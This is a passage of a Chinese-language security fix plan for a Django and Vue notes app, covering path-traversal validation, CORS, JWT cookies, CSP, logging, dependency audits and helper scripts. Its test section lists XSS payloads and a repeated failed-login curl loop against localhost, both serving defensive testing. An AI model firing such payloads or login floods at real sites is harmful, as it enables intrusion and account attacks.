**问题描述：** 虽然 Django 的 `FileField` 已经处理了路径遍历，但仍应显式验证。

**受影响文件：**
- `backend/notes/serializers.py:217`

**当前代码分析：**
```python
# 当前代码
markdown_file=uploaded_file,  # Django 自动处理路径安全
```

Django 的 `upload_to='notes/%Y/%m/%d/'` 会自动：
1. 清理文件名中的路径遍历字符（`../`）
2. 生成唯一文件名避免冲突
3. 限制文件保存在 `MEDIA_ROOT` 内

**额外防护（可选）：**

```python
import os
from django.core.exceptions import ValidationError

def validate_filename(filename):
    """验证文件名安全性"""
    # 禁止路径遍历
    if '..' in filename or '/' in filename or '\\' in filename:
        raise ValidationError('文件名包含非法字符。')
    
    # 禁止以点开头（隐藏文件）
    if filename.startswith('.'):
        raise ValidationError('不允许上传隐藏文件。')
    
    # 限制文件名长度
    if len(filename) > 255:
        raise ValidationError('文件名过长。')
    
    return filename

# 在 NoteUploadSerializer 中使用
def validate_file(self, value):
    validate_filename(value.name)
    # ... 其他验证
```

---

## 📋 新增实施清单

### 第八阶段：CORS 和 Cookie 安全（推荐优先级）

- [ ] 安装 `django-cors-headers`
- [ ] 配置 CORS 白名单
- [ ] 配置 Session Cookie 和 CSRF Cookie 安全属性
- [ ] 在 `.env.example` 中添加 CORS 配置示例
- [ ] 测试跨域请求

### 第九阶段：JWT Token 安全加固（高优先级）

**推荐方案：迁移到 HttpOnly Cookie**
- [ ] 修改登录视图，将 token 存储到 HttpOnly Cookie
- [ ] 创建 `CookieJWTAuthentication` 认证类
- [ ] 修改前端，删除 localStorage 存储逻辑
- [ ] 配置 axios `withCredentials: true`
- [ ] 测试登录、刷新、登出流程

**或者：保持 localStorage 但增强配置**
- [ ] 缩短 Access Token 有效期至 15 分钟
- [ ] 缩短 Refresh Token 有效期至 1 天
- [ ] 启用 Token 轮换和黑名单
- [ ] 添加登出 API
- [ ] 实施 CSP 策略

### 第十阶段：内容安全策略（CSP）

- [ ] 安装 `django-csp`
- [ ] 配置 CSP 策略
- [ ] 开发环境测试 CSP 报告
- [ ] 生产环境启用强制模式

### 第十一阶段：日志和审计

- [ ] 配置完整的日志系统
- [ ] 创建 `logs` 目录
- [ ] 在关键操作中添加日志记录
- [ ] 添加登录失败日志
- [ ] 添加敏感操作审计日志

### 第十二阶段：依赖安全

- [ ] 安装 `pip-audit` 或 `safety`
- [ ] 运行依赖漏洞扫描
- [ ] 修复发现的漏洞
- [ ] 添加 CI/CD 自动扫描
- [ ] 设置定期更新提醒

---

## 🧪 新增测试验证清单

### CORS 测试

创建测试文件 `test_cors.html`：
```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS Test</title>
</head>
<body>
    <script>
        fetch('http://localhost:8000/api/notes/', {
            credentials: 'include'
        })
        .then(res => res.json())
        .then(data => console.log('CORS OK:', data))
        .catch(err => console.error('CORS FAIL:', err))
    </script>
</body>
</html>
```

用不同域名（如 `http://localhost:3000`）打开，检查是否被 CORS 策略阻止。

### JWT Cookie 测试

```bash
# 测试登录后 Cookie 是否设置
curl -X POST http://localhost:8000/api/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}' \
  -v

# 查看响应头应包含 Set-Cookie
```

### CSP 测试

在浏览器开发者工具的 Console 中检查 CSP 违规报告。

---

## 🧪 测试验证清单

### XSS 防护测试

```markdown
# test_xss.md

<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>
```

上传后应该显示纯文本，不执行脚本。

### 登录限流测试

```bash
# 使用 curl 连续请求 6 次
for i in {1..6}; do
  curl -X POST http://localhost:8000/api/accounts/login/ \
    -H "Content-Type: application/json" \
    -d '{"username":"wrong","password":"wrong"}'
  echo "\n第 $i 次尝试"
done
```

第 6 次应该返回 429 错误。

### 文件大小测试

```bash
# 创建一个 11MB 的测试文件
head -c 11M /dev/urandom > large_file.md
```

上传应该被拒绝。

---

## ⚡ 快速修复脚本

为了方便执行，可以创建以下脚本：

**`backend/fix_security.sh`**（Linux/Mac）：

```bash
#!/bin/bash

echo "🔧 开始修复 P0 安全漏洞..."

# 激活虚拟环境
source ../.venv/bin/activate

# 安装依赖
echo "📦 安装安全相关依赖..."
pip install python-decouple bleach django-ratelimit

# 生成新密钥
echo "🔑 生成新的 SECRET_KEY..."
python -c "from django.core.management.utils import get_random_secret_key; print('新的 SECRET_KEY:', get_random_secret_key())"

# 更新依赖文件
pip freeze > requirements.txt

echo "✅ 依赖安装完成！"
echo "⚠️  请手动完成以下步骤："
echo "1. 创建 backend/.env 文件"
echo "2. 将上面生成的 SECRET_KEY 复制到 .env 文件"
echo "3. 按照 SECURITY_FIX_PLAN.md 修改代码文件"
```

**`backend/fix_security.bat`**（Windows）：

```batch
@echo off
echo 🔧 开始修复 P0 安全漏洞...

REM 激活虚拟环境
call ..\.venv\Scripts\activate

REM 安装依赖
echo 📦 安装安全相关依赖...
pip install python-decouple bleach django-ratelimit

REM 生成新密钥
echo 🔑 生成新的 SECRET_KEY...
python -c "from django.core.management.utils import get_random_secret_key; print('新的 SECRET_KEY:', get_random_secret_key())"

REM 更新依赖文件
pip freeze > requirements.txt

echo ✅ 依赖安装完成！
echo ⚠️  请手动完成以下步骤：
echo 1. 创建 backend\.env 文件
echo 2. 将上面生成的 SECRET_KEY 复制到 .env 文件
echo 3. 按照 SECURITY_FIX_PLAN.md 修改代码文件
pause
```

---

## 📚 参考资源

- [Django 安全最佳实践](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Bleach 文档](https://bleach.readthedocs.io/)
- [django-ratelimit 文档](https://django-ratelimit.readthedocs.io/)

---

## 🚨 紧急回滚

如果修复后出现问题，可以使用 Git 回滚：

```bash
# 查看最近的提交
git log --oneline -5

# 回滚到修复前的版本
git reset --hard <commit-hash>

# 或者只回滚特定文件
git checkout <commit-hash> -- backend/MoonBirdNotes/settings.py
```

---

## 📈 安全加固优先级建议

根据风险等级和实施难度，推荐以下修复顺序：

### 阶段一：立即修复（已完成 ✅）
1. ✅ 存储型 XSS
2. ✅ SECRET_KEY 硬编码
3. ✅ 登录暴力破解
4. ✅ 文件上传限制

### 阶段二：高优先级（1-2 天）
1. **JWT Token 迁移到 HttpOnly Cookie**（问题 8）
   - 风险：Medium，但修复后安全性大幅提升
   - 工作量：4-6 小时
   
2. **配置 CORS**（问题 7）
   - 风险：Medium，生产环境必需
   - 工作量：1 小时

3. **JWT Token 过期时间优化**（问题 9）
   - 风险：Medium
   - 工作量：2 小时

### 阶段三：中优先级（3-5 天）
1. **Content-Security-Policy**（问题 12）
   - 风险：Medium，深度防御
   - 工作量：2-3 小时

2. **Session/CSRF Cookie 安全配置**（问题 10、11）
   - 风险：Medium
   - 工作量：1 小时

### 阶段四：低优先级（持续改进）
1. **日志和审计系统**（问题 15、16）
   - 风险：Low，但对运维很重要
   - 工作量：2-3 小时

2. **依赖安全扫描**（问题 14）
   - 风险：Low，持续维护
   - 工作量：1 小时设置 + 定期执行

3. **请求体大小限制**（问题 13）
   - 风险：Low
   - 工作量：15 分钟

---

## 🎯 快速修复脚本（针对新问题）

### 快速修复脚本 - Phase 2

**`backend/quick_fix_security_phase2.sh`**（Linux/Mac）：

```bash
#!/bin/bash

echo "🔧 开始安全加固 Phase 2..."

# 激活虚拟环境
source ../.venv/bin/activate

# 安装新的安全依赖
echo "📦 安装安全依赖..."
pip install django-cors-headers django-csp pip-audit

# 运行安全审计
echo "🔍 运行依赖安全扫描..."
pip-audit || echo "⚠️  发现安全漏洞，请查看上方报告"

# 创建日志目录
echo "📁 创建日志目录..."
mkdir -p logs

# 更新依赖文件
echo "💾 更新 requirements.txt..."
pip freeze > requirements.txt

echo ""
echo "✅ Phase 2 依赖安装完成！"
echo ""
echo "⚠️  下一步手动操作："
echo "1. 按照 SECURITY_FIX_PLAN.md 修改 settings.py"
echo "2. 如果选择 HttpOnly Cookie 方案，修改 views.py 和前端代码"
echo "3. 在 .env 中添加 CORS_ALLOWED_ORIGINS 配置"
echo "4. 运行迁移：python manage.py migrate"
echo "5. 测试所有功能"
```

**`backend/quick_fix_security_phase2.bat`**（Windows）：

```batch
@echo off
echo 🔧 开始安全加固 Phase 2...

REM 激活虚拟环境
call ..\.venv\Scripts\activate

REM 安装新的安全依赖
echo 📦 安装安全依赖...
pip install django-cors-headers django-csp pip-audit

REM 运行安全审计
echo 🔍 运行依赖安全扫描...
pip-audit || echo ⚠️  发现安全漏洞，请查看上方报告

REM 创建日志目录
echo 📁 创建日志目录...
if not exist logs mkdir logs

REM 更新依赖文件
echo 💾 更新 requirements.txt...
pip freeze > requirements.txt

echo.
echo ✅ Phase 2 依赖安装完成！
echo.
echo ⚠️  下一步手动操作：
echo 1. 按照 SECURITY_FIX_PLAN.md 修改 settings.py
echo 2. 如果选择 HttpOnly Cookie 方案，修改 views.py 和前端代码
echo 3. 在 .env 中添加 CORS_ALLOWED_ORIGINS 配置
echo 4. 运行迁移：python manage.py migrate
echo 5. 测试所有功能
pause
```

---

## 📚 扩展阅读

- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [JWT Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [SameSite Cookie 解释](https://web.dev/articles/samesite-cookies-explained)

---

## 💡 安全最佳实践总结

### 认证与授权
- ✅ 使用 HttpOnly Cookie 存储敏感 token
- ✅ 设置合理的 token 过期时间
- ✅ 实施 token 轮换和黑名单机制
- ✅ 限制登录尝试次数
- ✅ 使用强密码策略

### 数据保护
- ✅ 所有敏感数据使用环境变量
- ✅ 对用户输入进行严格验证
- ✅ 使用参数化查询防止 SQL 注入
- ✅ 净化 HTML 输出防止 XSS
- ✅ 限制文件上传大小和类型

### 网络安全
- ✅ 配置 CORS 白名单
- ✅ 使用 HTTPS（生产环境）
- ✅ 配置安全响应头（CSP、HSTS、X-Frame-Options）
- ✅ 设置 Cookie 安全属性（HttpOnly、Secure、SameSite）

### 监控与审计
- ✅ 记录所有安全相关事件
- ✅ 审计敏感操作（删除、权限变更等）
- ✅ 定期检查依赖漏洞
- ✅ 监控异常登录行为

### 开发流程
- ✅ 代码审查关注安全问题
- ✅ 使用自动化安全扫描工具
- ✅ 定期更新依赖库
- ✅ 在测试环境验证安全修复

---

**本次安全审计完成时间：2026-06-24**

**审计范围：**
- ✅ 后端 Django 配置和代码
- ✅ 前端 Vue.js 代码
- ✅ API 认证和权限
- ✅ 数据验证和序列化
- ✅ 第三方依赖

**发现问题总数：17 个**
- 🔴 Critical: 0
- 🟠 High: 0
- 🟡 Medium: 6（已修复 0，待修复 6）
- 🟢 Low: 5
- ✅ 已修复: 6

**下次审计建议时间：2026-07 月底或重大功能上线前**
